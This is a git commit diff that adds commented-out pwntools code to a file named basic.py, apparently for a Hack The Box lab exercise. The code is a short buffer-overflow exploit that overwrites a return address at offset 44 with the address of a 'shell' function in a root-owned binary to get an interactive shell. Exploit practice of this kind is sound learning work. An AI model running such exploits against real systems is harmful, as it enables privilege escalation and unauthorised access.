3fbc73a17069347f10ea022166f723a2d4774ced
reesdanny <39764146+reesdanny@users.noreply.github.com>
2021-12-29 08:11:45 +0000

    Update basic.py

--- pwn/HTB/basic.py
+++ pwn/HTB/basic.py
@@ -1,5 +1,15 @@
-#pwntools
+#from pwn import *
+#proc = process('/opt/secret/root')
+#elf = ELF('/opt/secret/root')
+#shell_func = elf.symbols.shell
+#payload = fit({
+#44: shell_func # this adds the value of shell_func after 44 characters
+#})
+#proc.sendline(payload)
+#proc.interactive()#pwntools
 #10.10.102.104
+
+
 
 
 #jaaa
